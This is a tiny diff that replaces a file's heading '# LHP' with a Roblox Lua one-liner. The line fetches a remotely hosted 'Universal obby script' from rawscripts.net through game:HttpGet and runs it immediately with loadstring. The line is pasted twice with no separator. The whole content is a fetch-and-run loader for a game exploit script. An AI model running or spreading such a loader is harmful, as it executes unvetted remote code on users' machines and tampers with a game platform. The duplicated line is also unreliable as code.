@@ -1,1 +1,1 @@
-# LHP
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-obby-script-48382"))()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-obby-script-48382"))()
